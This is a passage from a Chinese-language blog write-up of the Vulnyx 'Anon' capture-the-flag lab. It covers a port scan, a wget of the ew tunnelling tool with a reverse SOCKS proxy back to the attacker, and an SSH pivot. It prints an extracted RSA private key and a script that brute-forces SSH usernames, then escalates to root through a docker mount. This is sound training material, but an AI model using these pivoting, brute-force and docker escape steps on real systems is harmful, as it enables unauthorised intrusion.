(Unknown)\n</code></pre>\n<p>在扫描一下服务信息，发现是<code>SSH</code>服务，上边的密码可能就是这里的</p>\n<pre><code class=\"hljs language-python\">hacktivist@debian1:/var/www/html/Anonymous-Connections/victims$ sudo nmap -sT -A -T4 -O <span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.10</span><span class=\"hljs-number\">.20</span>\n -T4 -O <span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.10</span><span class=\"hljs-number\">.20</span>\nStarting Nmap <span class=\"hljs-number\">7.93</span> ( https://nmap.org ) at <span class=\"hljs-number\">2025</span>-02-07 <span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">52</span> UTC\nNmap scan report <span class=\"hljs-keyword\">for</span> debian2.private (<span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.10</span><span class=\"hljs-number\">.20</span>)\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00010</span>s latency).\nNot shown: <span class=\"hljs-number\">999</span> closed tcp ports (conn-refused)\nPORT     STATE SERVICE VERSION\n<span class=\"hljs-number\">2222</span>/tcp <span class=\"hljs-built_in\">open</span>  ssh     OpenSSH <span class=\"hljs-number\">9.2</span>p1 Debian <span class=\"hljs-number\">2</span>+deb12u4 (protocol <span class=\"hljs-number\">2.0</span>)\n| ssh-hostkey: \n|   <span class=\"hljs-number\">256</span> 39b4417103f9114efe67d53ab63e4ceb (ECDSA)\n|_  <span class=\"hljs-number\">256</span> e133f35557dd7df76fdfdeea5cb7263d (ED25519)\nMAC Address: 02:<span class=\"hljs-number\">42</span>:0A:0A:0A:<span class=\"hljs-number\">14</span> (Unknown)\nDevice <span class=\"hljs-built_in\">type</span>: general purpose\nRunning: Linux <span class=\"hljs-number\">4.</span>X|<span class=\"hljs-number\">5.</span>X\nOS CPE: cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">4</span> cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">5</span>\nOS details: Linux <span class=\"hljs-number\">4.15</span> - <span class=\"hljs-number\">5.6</span>\nNetwork Distance: <span class=\"hljs-number\">1</span> hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n<span class=\"hljs-number\">1</span>   <span class=\"hljs-number\">0.10</span> ms debian2.private (<span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.10</span><span class=\"hljs-number\">.20</span>)\n\nOS <span class=\"hljs-keyword\">and</span> Service detection performed. Please report <span class=\"hljs-built_in\">any</span> incorrect results at https://nmap.org/submit/ .\nNmap done: <span class=\"hljs-number\">1</span> IP address (<span class=\"hljs-number\">1</span> host up) scanned <span class=\"hljs-keyword\">in</span> <span class=\"hljs-number\">1.72</span> seconds\n</code></pre>\n<h2>转发端口</h2>\n<ol>\n<li>\n<p>将<code>ew</code>上传到靶机,并设置权限</p>\n<pre><code class=\"hljs language-python\">wget <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.4</span>/ew_for_linux64\n\nchmod +x ew_for_linux64\n</code></pre>\n</li>\n<li>\n<p>设置反向代理</p>\n<p><code>Kali</code>监听<code>1080</code>端口，收到的请求转发给反向链接过来到<code>8889</code>端口的主机</p>\n<pre><code class=\"hljs language-python\">./ew_for_linux64 -s rcsocks -l <span class=\"hljs-number\">1080</span> -e <span class=\"hljs-number\">8889</span>\n</code></pre>\n<p>靶机反向链接<code>Kali</code>的<code>8889</code>端口</p>\n<pre><code class=\"hljs language-python\">./ew_for_linux64 -s rssocks -d <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.4</span> -e <span class=\"hljs-number\">8889</span>\n</code></pre>\n</li>\n<li>\n<p><code>kali</code>设置代理，修改<code>/etc/proxycharin4.conf</code></p>\n<pre><code class=\"hljs language-python\">[ProxyList]\n<span class=\"hljs-comment\"># add proxy here ...</span>\n<span class=\"hljs-comment\"># meanwile</span>\n<span class=\"hljs-comment\"># defaults set to \"tor\"</span>\nsocks4  <span class=\"hljs-number\">127.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.1</span>     <span class=\"hljs-number\">1080</span>\n</code></pre>\n</li>\n<li>\n<p><code>kali</code>通过<code>proxychain4</code>来连接靶机内网，使用上边得到的密码成功进入，但是很容易断开（泪）</p>\n<pre><code class=\"hljs language-python\">┌──(root㉿kali)-[~/Desktop/Tools]\n└─<span class=\"hljs-comment\"># proxychains4 ssh root@10.10.10.20 -p 2222</span>\n[proxychains] config file found: /etc/proxychains4.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so<span class=\"hljs-number\">.4</span>\n[proxychains] DLL init: proxychains-ng <span class=\"hljs-number\">4.17</span>\n[proxychains] Strict chain  ...  <span class=\"hljs-number\">127.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.1</span>:<span class=\"hljs-number\">1080</span>  ...  <span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.10</span><span class=\"hljs-number\">.20</span>:<span class=\"hljs-number\">2222</span> &#x3C;--   <span class=\"hljs-number\">0</span> --> (<span class=\"hljs-built_in\">open</span>)used/unused  <span class=\"hljs-number\">1</span>/<span class=\"hljs-number\">999</span>\n ...  OK\nroot@<span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.10</span><span class=\"hljs-number\">.20</span><span class=\"hljs-string\">'s password: \nLinux debian2 6.1.0-30-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.124-1 (2025-01-12) x86_64\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nLast login: Tue Feb  4 23:12:09 2025 from 10.10.10.1\nroot@debian2:~# \n</span></code></pre>\n</li>\n</ol>\n<h2>靶机信息收集 - 2</h2>\n<p>在当前目录可以找到<code>.ssh</code>文件夹，里边有<code>id_rsa</code></p>\n<pre><code class=\"hljs language-python\">root@debian2:~<span class=\"hljs-comment\"># ls -al                                                        </span>\ntotal <span class=\"hljs-number\">28</span>                                                                      \ndrwx------ <span class=\"hljs-number\">4</span> root root <span class=\"hljs-number\">4096</span> Feb  <span class=\"hljs-number\">4</span> <span class=\"hljs-number\">22</span>:01 .                      \ndrwxr-xr-x <span class=\"hljs-number\">1</span> root root <span class=\"hljs-number\">4096</span> Feb  <span class=\"hljs-number\">4</span> <span class=\"hljs-number\">11</span>:<span class=\"hljs-number\">17</span> ..                     \n-rw------- <span class=\"hljs-number\">1</span> root root   <span class=\"hljs-number\">93</span> Feb  <span class=\"hljs-number\">4</span> <span class=\"hljs-number\">23</span>:<span class=\"hljs-number\">12</span> .bash_history          \n-rw-r--r-- <span class=\"hljs-number\">1</span> root root  <span class=\"hljs-number\">586</span> Feb  <span class=\"hljs-number\">4</span> <span class=\"hljs-number\">20</span>:<span class=\"hljs-number\">29</span> .bashrc                \ndrwxr-xr-x <span class=\"hljs-number\">3</span> root root <span class=\"hljs-number\">4096</span> Feb  <span class=\"hljs-number\">4</span> <span class=\"hljs-number\">20</span>:<span class=\"hljs-number\">21</span> .local                 \n-rw-r--r-- <span class=\"hljs-number\">1</span> root root  <span class=\"hljs-number\">161</span> Jul  <span class=\"hljs-number\">9</span>  <span class=\"hljs-number\">2019</span> .profile               \ndrwx------ <span class=\"hljs-number\">2</span> root root <span class=\"hljs-number\">4096</span> Feb  <span class=\"hljs-number\">4</span> <span class=\"hljs-number\">21</span>:<span class=\"hljs-number\">38</span> .ssh \n\nroot@debian2:~/.ssh<span class=\"hljs-comment\"># ls</span>\nauthorized_keys  id_rsa\n\nroot@debian2:~/.ssh<span class=\"hljs-comment\"># cat authorized_keys </span>\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCRrZRaJ9mGQEKzOURbCFrL3WIKdEpcCU+RhEKshjHYrwSVa/sLPqTPMtCFN2AIAOk5kYmWxWcd4FRXZvkuh5+hJKtyOCkzyD/nlX7JRH9U4TjpmNbJjAwKi68/iOYBBrjR+Y8JYG8poyHQNAcFvnKuFLiuYRl2fu/qfIFoCtCAJcWVgz00yKsa0fpwqEqr1+CnbIQN/K+W6rYM1kdwzCE8H2YUQ4SNCwngOVGh3RZ4UlJVlLJMJ7/awNHFgYQew/Iwliziu4AcidQkhgELCw+t52wSY2vEQ2OKumnw+NMikL6RcESAsYhyPO6fNPYzcvscwKMacngBXyfPKSOSYP2N\n</code></pre>\n<p>我们将<code>id_rsa</code>保存到<code>kali</code> ，可能是某个正确的用户的密钥，但是我们不知道用户名</p>\n<pre><code class=\"hljs language-python\">-----BEGIN RSA PRIVATE KEY-----\nMIIEpQIBAAKCAQEAka2UWifZhkBCszlEWwhay91iCnRKXAlPkYRCrIYx2K8ElWv7\nCz6kzzLQhTdgCADpOZGJlsVnHeBUV2b5LoefoSSrcjgpM8g/55V+yUR/VOE46ZjW\nyYwMCouvP4jmAQa40fmPCWBvKaMh0DQHBb5yrhS4rmEZdn7v6nyBaArQgCXFlYM9\nNMirGtH6cKhKq9fgp2yEDfyvluq2DNZHcMwhPB9mFEOEjQsJ4DlRod0WeFJSVZSy\nTCe/2sDRxYGEHsPyMJYs4ruAHInUJIYBCwsPredsEmNrxENjirpp8PjTIpC+kXBE\ngLGIcjzunzT2M3L7HMCjGnJ4AV8nzykjkmD9jQIDAQABAoIBAHON3Zx5+ajtNjtW\nFKuk/+iwLcGfJxDEbfI+mGijdcysX5Vq9tKfmTml1BOnriwLFPUORbZr1XS0ahJ+\nYvAOsoevP7O1arFhiZdYVR6vj9UzZeKd0tpClZaT4KokHFX6EAa2z0gfz22Wsg6m\nBl//BpahZzEjYoBFBmfY5QkzctoCZQRhkTAhR520+oCFiosHGyiH6QCGYsO6WmwQ\n7w7cm7rQ/MLNkgenRFUm0PRXrqti2K3kFUnU/Pfb9k4DoUtKSjpvA3kNbH9pIxlN\nskbCJJfJeQpalBKwQyGqNkCzH9qMm31ZuLHsp6L73po2rWFIcoeraLhA/5No+S21\n+v01t30CgYEA5mtTtslQmR2xhVr69z1lDdaFFaGsUWH5vlIGBvphAQsl2OwUbWk/\n7rLy4yhddEYTfyc5xorkRsjmNjNyhMrtYks1ycvtEvCee7NuGHSO0Grzp3MKbAAY\nt/gmGMckr9zdcsVVCIshm8PYo4feXClrHMe0MWLv97kcgGWvGLH+4UcCgYEAodnZ\ndPL9J/O83kO5zybWlUL4RoIGLdP2axqNxoDju87qKNTKdsrKnmNV5NlQ+VH05eZ/\ngQ5ninqFAR0hsvf4AHYmjySwY6S6mGnrXlhYkUE37crHVxdQruvtgUk4cTB0Lbk9\nVg0LoAnCJr96nJSWVcpER/p7/KD1LIcU/4oT9IsCgYEAlCT9NdBJWaiVsj/Ei6GV\nj0gVWMsRl2F+yLbD2UixhZI9SzK+D3pT+IxlTVdufotvjZkStGwoSLpyCPca8fXm\nmgPxGUVbr4m026OJbX/DMo0RCuAUG0wUmHObSuL+23MNjfUBrvSFLzjD2KBKfsbC\nb0aWvAn4bzU89fBqm14VmZECgYEAn1T7+<span class=\"hljs-number\">2J</span>+j8cl5lUb5W9hjb1I9vhnptPk4VlZ\nutIF30x6PkoFKt7GixhVZZ3+VgM1qOG6Ic2RZsTojMkl9K6iSaoGmaJPtzhirUqQ\nd+dXAWAH9CNNDFKajikaPc1cMCm4JY8Xb9AV4q3YoRadWOn5+WjOwWE4j+HQms48\ngLhonrMCgYEAthB9GOhxzeX5VEaw91tWhAdD+WNEO9TMN9fsyE9cISddgmBA5ozh\naTJl/gt09UodQhCNTmjYGByTkzGPH5c01HVhWfompn3GmK3jKwTbrUYh+P13Q1vn\nA6j+O3UaX0P8w4seXeGyU2DA9iWCkwiKUUb4nj5IWt50Khmjv7BaXog=\n-----END RSA PRIVATE KEY-----\n</code></pre>\n<h2>爆破用户名</h2>\n<p>使用<code>GPT</code>生成脚本（好用）</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-comment\">#!/bin/bash</span>\n\n<span class=\"hljs-comment\"># 目标服务器信息</span>\nTARGET_IP=<span class=\"hljs-string\">\"192.168.56.19\"</span>\nPRIVATE_KEY=<span class=\"hljs-string\">\"id\"</span>\nUSERNAME_FILE=<span class=\"hljs-string\">\"./../Dict/SecLists-2024.3/Usernames/xato-net-10-million-usernames.txt\"</span>\n\n<span class=\"hljs-comment\"># 检查私钥文件是否存在</span>\n<span class=\"hljs-keyword\">if</span> [ ! -f <span class=\"hljs-string\">\"$PRIVATE_KEY\"</span> ]; then\n  echo <span class=\"hljs-string\">\"密钥文件 $PRIVATE_KEY 不存在，请检查路径。\"</span>\n  exit <span class=\"hljs-number\">1</span>\nfi\n\n<span class=\"hljs-comment\"># 检查用户名字典文件是否存在</span>\n<span class=\"hljs-keyword\">if</span> [ ! -f <span class=\"hljs-string\">\"$USERNAME_FILE\"</span> ]; then\n  echo <span class=\"hljs-string\">\"用户名字典文件 $USERNAME_FILE 不存在，请检查路径。\"</span>\n  exit <span class=\"hljs-number\">1</span>\nfi\n\n<span class=\"hljs-comment\"># 读取用户名字典</span>\nUSERNAMES=( $(cat <span class=\"hljs-string\">\"$USERNAME_FILE\"</span>) )\n\n<span class=\"hljs-comment\"># 爆破用户名循环</span>\n<span class=\"hljs-keyword\">for</span> USERNAME <span class=\"hljs-keyword\">in</span> <span class=\"hljs-string\">\"${USERNAMES[@]}\"</span>; do\n  echo <span class=\"hljs-string\">\"尝试登录: $USERNAME\"</span>\n\n  <span class=\"hljs-comment\"># 执行 SSH 登录，2秒超时避免卡住</span>\n  OUTPUT=$(ssh -o BatchMode=yes -o ConnectTimeout=<span class=\"hljs-number\">2</span> <span class=\"hljs-string\">\"$USERNAME\"</span>@$TARGET_IP -i <span class=\"hljs-string\">\"$PRIVATE_KEY\"</span> exit <span class=\"hljs-number\">2</span>>&#x26;<span class=\"hljs-number\">1</span>)\n\n  <span class=\"hljs-comment\"># 检查是否输出包含 \"password\"（通常代表需要密码）</span>\n  <span class=\"hljs-keyword\">if</span> echo <span class=\"hljs-string\">\"$OUTPUT\"</span> | grep -qi <span class=\"hljs-string\">\"password\"</span>; then\n    echo <span class=\"hljs-string\">\"[失败] $USERNAME 需要密码，跳过。\"</span>\n  <span class=\"hljs-keyword\">else</span>\n    echo <span class=\"hljs-string\">\"[成功] 找到有效用户名: $USERNAME\"</span>\n  fi\n\n  echo <span class=\"hljs-string\">\"-------------------------------\"</span>\ndone\n</code></pre>\n<p>最后爆破出来用户名<code>alfredo</code></p>\n<pre><code class=\"hljs language-python\">┌──(root㉿kali)-[~/Desktop/test/Anon]\n└─<span class=\"hljs-comment\"># ssh alfredo@192.168.56.19 -i id</span>\nalfredo@anon:~$ \n</code></pre>\n<h2>UserFlag</h2>\n<pre><code class=\"hljs language-python\">alfredo@anon:~$ cat user.txt \naf13f20ce2fb4266b4d381cf8f60f85f\n</code></pre>\n<h2>提权</h2>\n<p>查看权限，拥有<code>Docker</code>权限</p>\n<pre><code class=\"hljs language-python\">alfredo@anon:/home$ <span class=\"hljs-built_in\">id</span>\nuid=<span class=\"hljs-number\">1000</span>(alfredo) gid=<span class=\"hljs-number\">1000</span>(alfredo) grupos=<span class=\"hljs-number\">1000</span>(alfredo),<span class=\"hljs-number\">109</span>(docker)\n</code></pre>\n<pre><code class=\"hljs language-python\">alfredo@anon:/home$ docker ps\nCONTAINER ID   IMAGE           COMMAND       CREATED      STATUS       PORTS                               NAMES\ne0bc4c70b0df   debian:latest   <span class=\"hljs-string\">\"/bin/bash\"</span>   <span class=\"hljs-number\">3</span> days ago   Up <span class=\"hljs-number\">6</span> hours                                       debian2\nb2d474841fe1   debian:latest   <span class=\"hljs-string\">\"/bin/bash\"</span>   <span class=\"hljs-number\">3</span> days ago   Up <span class=\"hljs-number\">6</span> hours   <span class=\"hljs-number\">0.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.0</span>:<span class=\"hljs-number\">80</span>-><span class=\"hljs-number\">80</span>/tcp, :::<span class=\"hljs-number\">80</span>-><span class=\"hljs-number\">80</span>/tcp   debian1\n</code></pre>\n<pre><code class=\"hljs language-python\">alfredo@anon:/home$ docker images\nREPOSITORY   TAG       IMAGE ID       CREATED      SIZE\ndebian2      latest    8862ed54f766   <span class=\"hljs-number\">3</span> days ago   117MB\ndebian1      latest    62c15a42ee05   <span class=\"hljs-number\">3</span> days ago   117MB\ndebian       latest    18f9bd665a29   <span class=\"hljs-number\">4</span> days ago   117MB\n</code></pre>\n<p>可以直接提权了</p>\n<pre><code class=\"hljs language-python\">alfredo@anon:/home$ docker run -v /:/mnt --rm -it debian chroot /mnt sh\n<span class=\"hljs-comment\"># id</span>\nuid=<span class=\"hljs-number\">0</span>(root) gid=<span class=\"hljs-number\">0</span>(root) groups=<span class=\"hljs-number\">0</span>(root)\n</code></pre>\n<h2>RootFlag</h2>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-comment\"># cat /root/root.txt</span>\nf3a421bdd1e5119f49c3fda29838cf79\n</code></pre>\n<h2>总结</h2>\n<p>更熟悉了<code>Docker</code>容器环境下如何操作，更熟悉<code>ew</code>的使用，<code>Shell</code>脚本的利用，夸大思维</p>","title":"Vulnyx - Anon","date":"2025-04-03","updated":"2025-04-03","comments":true,"tags":["Vulnyx","Linux靶机"],"categories":"靶机","description":"Anon\n\n Difficulty: Medium\n \n\n信息收集\n\n\n\n\n\n\n\n\n\n优先级 `80`  `22`\n\n80 端口\n\n访问主页，是默认页面\n\n\n\n没什么信息，扫描一下目录，扫描到`/Anonymous-Connections` 目录\n\n\n\n访问，提示 输入目标`IP` \n\n\n\n经过测试，这里接入的是`nmap`的命令\n\n\n\n尝试一下命令拼接 `127.0.0.1 | ls` ，会提示..."},"recentPosts":[{"id":"TheHackersLabsCyberGuard","title":"TheHackersLabs - CyberGuard","date":"2025-07-28","isEncrypted":false,"year":"2025","month":"07","day":"28"},{"id":"TheHackersLabsPacharán","title":"TheHackersLabs - Pacharán","date":"2025-07-27","isEncrypted":false,"year":"2025","month":"07","day":"27"},{"id":"TheHackersLabsBack To The Future I","title":"TheHackersLabs - Back To The Future I","date":"2025-07-26","isEncrypted":false,"year":"2025","month":"07","day":"26"},{"id":"TheHackersLabsNodeCeption","title":"TheHackersLabs - NodeCeption","date":"2025-07-25","isEncrypted":false,"year":"2025","month":"07","day":"25"},{"id":"TheHackersLabsPildoritas","title":"TheHackersLabs - Pildoritas","date":"2025-07-24","isEncrypted":false,"year":"2025","month":"07","day":"24"},{"id":"HackTheBoxMachine - Scepter","title":"HackTheBox - Machine - Scepter","date":"2025-04-26","isEncrypted":false,"year":"2025","month":"07","day":"24"},{"id":"TheHackersLabsMentallity","title":"TheHackersLabs - Mentallity","date":"2025-07-23","isEncrypted":false,"year":"2025","month":"07","day":"23"}]},"__N_SSG":true}